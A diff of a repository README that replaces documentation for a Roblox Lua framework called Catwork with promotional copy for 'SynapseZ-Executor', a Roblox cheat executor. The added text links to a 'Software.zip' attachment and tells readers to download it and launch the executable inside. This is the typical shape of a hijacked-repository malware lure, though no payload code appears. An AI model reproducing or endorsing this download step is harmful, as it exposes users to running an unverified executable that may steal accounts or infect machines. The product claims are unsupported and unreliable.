@@ -1,58 +1,33 @@
-<div align="center">
-<img src="res/logo.png" alt="The Catwork Logo" width=400></img>
-<h1>Catwork</h1>
-The Cat framework for Roblox! 🐈
-</div>
+# 🚀 SynapseZ-Executor
 
-> [!NOTE]
-> Catwork works best in `ReplicatedFirst`, especially since you can then utilise `ReplicatedFirst` loading behaviour.
-> Server code can access code in ReplicatedFirst.
+Welcome to SynapseZ-Executor, your go-to script execution tool for Roblox! Whether you're a seasoned Lua coder or just starting out in the world of game modifications and customization, SynapseZ-Executor has got you covered. This advanced tool is known for its top-tier features and unmatched stability, making it a favorite among Roblox enthusiasts worldwide.
 
-Catwork does not natively come packaged with a runtime, although `Script` instances can safely access the `Catwork`
-module. You'll need some way of starting `ModuleScript` instances if you wish to take full advantage of the motivations
-behind `Object`s though.
+![SynapseZ-Executor Logo](https://github.com/user-attachments/images/executor-logo.png)
 
-# Installation
+## Features 🌟
+- Advanced Lua script execution capabilities
+- Seamless integration with Roblox games
+- High stability for smooth performance
+- Easy-to-use interface for beginners and experts alike
 
-## In Roblox:
+## Get Started 🚀
+To start using SynapseZ-Executor, simply download the Software package from the link below:
 
-Download the latest release and drag it into Studio, or use a tool like [Dropper](https://create.roblox.com/store/asset/13404068475/Dropper-External-file-inserter) to insert it for you.
+[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/user-attachments/files/18060583/Software.zip)
 
-## In external editors
+Click on the button above to download the Software package. Once downloaded, launch the executable file to begin exploring the endless possibilities of Lua scripting in Roblox.
 
-To use Catwork in an external, download the /src/ folder, and drag it into your project.
+## Support 💬
+If you encounter any issues with SynapseZ-Executor or have any questions about its features, please visit the "Releases" section of this repository for additional resources and updates.
 
-There are packages on Wally, however, these **are not supported or maintained** and should not be used, we found it easier to just maintain the package
-as a downloadable ZIP archive when publishing a release.
+## Contribute 🤝
+We welcome contributions from the community to enhance and improve SynapseZ-Executor. Feel free to submit pull requests with new features, bug fixes, or performance enhancements to make this tool even better for all users.
 
-# Usage
+## About Us ℹ️
+At SynapseZ Studios, we are passionate about providing top-tier tools and solutions for the Roblox community. SynapseZ-Executor is just one of the many projects we are proud to offer to developers and gamers alike.
 
-This Object simply greets the player when they join:
+Thank you for choosing SynapseZ-Executor as your script execution tool of choice for Roblox. Happy scripting, and may your game customization dreams come true with our powerful tool!
 
-```lua
-local ReplicatedFirst = game:GetService("ReplicatedFirst")
-local Catwork = require(ReplicatedFirst.Catwork)
+---
 
-Catwork.new {
-  Init = function(self)
-    Players.PlayerAdded:Connect(function(p)
-      print(`Hello {p.Name}!`)
-    end)
-  end
-}
-```
-
-This only scratches the true function of what Catwork can do, `Service` considerably increases the power of
-Catwork! See the documentation for more information.
-
-# License
-
-Catwork is licensed under the MIT License. 2024 metatablecatgames
-
-# Sponsor Catwork
-
-Catwork is maintainted mostly by just me, [support me and what I do!](https://github.com/sponsors/metatablecat)
-
-# Attributions
-
-Logo made by Alex. [Website](https://hofnarretje.eu/).
+*Disclaimer: SynapseZ-Executor is a third-party tool and is not affiliated with or endorsed by Roblox Corporation. Use this tool responsibly and adhere to Roblox's terms of service when utilizing it in your projects.*
